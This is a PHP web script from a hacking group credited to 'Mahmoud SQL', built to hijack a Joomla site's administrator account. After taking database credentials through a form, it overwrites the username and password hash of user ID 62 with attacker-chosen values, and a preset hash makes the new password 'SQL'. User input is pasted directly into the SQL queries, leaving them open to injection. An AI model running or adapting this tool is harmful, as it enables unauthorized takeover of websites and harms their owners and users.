<?php
/*
Coded By Mahmoud SQL
*/
?>
<title>Team SQL # Mahmoud SQL</title>
<html>
<style>
input, select, text {
background-color: white;
border-style: white;
border-width: 1px;
font-family: verdana, arial, sans-serif;
font-size: 11px;
color: green;
padding: 0px;
</style>
<head>

<table id="table2" style="border-collapse: collapse;" bordercolordark="#666666" bordercolorlight="#c0c0c0" width="100%" 

bgcolor="black" border="1" cellpadding="5" cellspacing="0">

  <tbody>
  <tr>
    <td style="font-size: 11px; color: rgb(217, 217, 217); verdana, arial, sans-serif" valign="top" width="100%">
      <center><b>

		<font color="#008000"></style>
<head>

<meta http-equiv="Content-Type" content="text/html; charset=windows-1252" />

</font>

<div align="center">
<center><p><font size="5" color="#008000">#...Change Password of Admin Joomla ...#</font><p>
<span lang="ar-jo"><font size="5" color="#008000">&#1587;&#1603;&#1585;&#1576;&#1578; &#1578;&#1594;&#1610;&#1585; &#1576;&#1575;&#1587;&#1608;&#1585;&#1583; &#1575;&#1604;&#1575;&#1583;&#1605;&#1606; 
&#1604;&#1587;&#1603;&#1585;&#1576;&#1578; &#1575;&#1604;&#1580;&#1605;&#1604;&#1577; </font></span></center>
<font size="7" color="red"></p>
<center><p><font size="5"><a href="http://www.team-sql.com/cc">
<font color="#008000">#..Team SQL..#</font></a></font></font><font size="5" color="#008000"><p>
<a href="http://WWW.TEAM-SQL.COM">WWW.TEAM-SQL.COM</a><p>Coded By Mahmoud SQL 
<p>SQL(at)Live(dot)Se</center></font><font size="6" color="white"></p>
</font>
<center>
<center><p></b><font size="7" color="red"><font size="6" color="#008000">
Greetz For :Mr SohayL&nbsp; # Mr Danger # Tnt HACKER # SyRiAn_34G13</br></font></font>
<p><span lang="ar-jo"><font size="5" color="#008000">&#1602;&#1605; &#1576;&#1606;&#1587;&#1582; &#1576;&#1610;&#1575;&#1606;&#1575;&#1578; &#1575;&#1604;&#1602;&#1575;&#1593;&#1583;&#1577; &#1608; 
&#1578;&#1593;&#1576;&#1574;&#1578;&#1607;&#1575; &#1607;&#1606;&#1575; &#1579;&#1605;&nbsp; &#1604;&#1575; &#1578;&#1602;&#1608;&#1605; &#1576;&#1578;&#1594;&#1610;&#1585; &#1576;&#1575;&#1587;&#1608;&#1585;&#1583; &#1575;&#1604;&#1575;&#1583;&#1605;&#1606; &#1575;&#1604;&#1584;&#1610; &#1587;&#1610;&#1603;&#1608;&#1606; &#1575;&#1604;&#1576;&#1575;&#1587;&#1608;&#1585;&#1583; &#1575;&#1604;&#1580;&#1583;&#1610;&#1583;</font></span><p>
<font size="5" color="#008000"><span lang="ar-jo">&#1575;&#1604;&#1576;&#1575;&#1587;&#1608;&#1585;&#1583; &#1575;&#1604;&#1580;&#1583;&#1610;&#1583; &#1607;&#1608; : </span>
SQL</font><p>&nbsp;</center><b>

<font size="5" color="white">


</font></b></table>
</center>
<br></br>

<center>



</head>
    <body bgcolor="black" text="green">
       <div align="center">  
</div> 
      <?
if(empty($_POST['pwd'])){
echo "<FORM method=\"POST\">
host : <INPUT size=\"15\" value=\"localhost\" name=\"localhost\" type=\"text\">
database : <INPUT size=\"15\" value=\"database\" name=\"database\" type=\"text\"><br>
username : <INPUT size=\"15\" value=\"db_user\" name=\"username\" type=\"text\">
password : <INPUT size=\"15\" value=\"**\" name=\"password\" type=\"password\"><br>
      <br>
Set A New username 4 Login : <INPUT name=\"admin\" size=\"15\" value=\"Mahmoud\"><br>
Don`t Change it Password is : SQL: <INPUT name=\"pwd\" size=\"15\" value=\"23f8d1a856992bf10d677d3abd482b2e:4yeeXqIbyqPlw5IhGrZnfDjpq0pqknY7\"><br>

<INPUT value=\"change\" name=\"send\" type=\"submit\">
</FORM>";
}else{
$localhost = $_POST['localhost'];
$database  = $_POST['database'];
$username  = $_POST['username'];
$password  = $_POST['password'];
$pwd       = $_POST['pwd'];
$admin     = $_POST['admin'];


         @mysql_connect($localhost,$username,$password) or die(mysql_error());
         @mysql_select_db($database) or die(mysql_error());

$hash = crypt($pwd);

$SQL=@mysql_query("UPDATE jos_users SET username ='".$admin."' WHERE ID = 62") or die(mysql_error());
$SQL=@mysql_query("UPDATE jos_users SET password ='".$pwd."' WHERE ID = 62") or die(mysql_error());

if($SQL){
echo "<b>root@secure:# ~ Success :now use a new user and password is : SQL   ## Good Luck Script Coded By Mahmoud SQL</b> ";
}

}

?>
<br></br>
<br></br>
<br></br>
<br>&nbsp;<p>Coded By Mahmoud SQL</p>